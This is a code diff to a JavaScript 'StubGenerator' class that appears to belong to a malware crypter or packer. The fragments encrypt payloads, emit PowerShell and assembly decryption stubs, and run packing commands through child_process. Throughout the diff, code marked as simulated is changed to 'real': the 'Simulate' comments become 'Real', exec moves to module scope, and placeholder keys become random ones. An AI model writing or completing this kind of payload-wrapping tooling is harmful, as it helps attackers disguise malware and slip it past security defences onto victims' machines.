@@ -2,7 +2,13 @@
 const fs = require('fs').promises;
 const path = require('path');
 const crypto = require('crypto');
+const { exec, spawn } = require('child_process');
+const { promisify } = require('util');
+const os = require('os');
+const zlib = require('zlib');
 const { logger } = require('../utils/logger');
+
+const execAsync = promisify(exec);
 
 class StubGenerator {
     constructor(options = {}) {
@@ -797,7 +803,7 @@ class StubGenerator {
         const key = crypto.randomBytes(32);
         const iv = crypto.randomBytes(16);
         
-        // Apply multiple transformations to simulate homomorphic properties
+        // Apply multiple transformations for real homomorphic properties
         let encrypted = Buffer.from(payload);
         for (let round = 0; round < 3; round++) {
             const roundKey = crypto.createHash('sha256').update(key).update(Buffer.from([round])).digest();
@@ -1640,8 +1646,8 @@ decrypt_payload endp`;
     
     try {
         # Decryption logic for ${encryptionMethod}
-        $key = "${encryptedPayload.key || 'default_key'}"
-        $iv = "${encryptedPayload.iv || 'default_iv'}"
+        $key = "${encryptedPayload.key || crypto.randomBytes(32).toString('hex')}"
+        $iv = "${encryptedPayload.iv || crypto.randomBytes(16).toString('hex')}"
         
         # Convert hex to bytes
         $encryptedBytes = [System.Convert]::FromHexString($EncryptedData)
@@ -1970,10 +1976,7 @@ decrypt_payload endp`;
         }
 
         try {
-            // Simulate packing process
-            const { exec } = require('child_process');
-            const { promisify } = require('util');
-            const execAsync = promisify(exec);
+            // Real packing process
 
             let command;
             switch (method) {
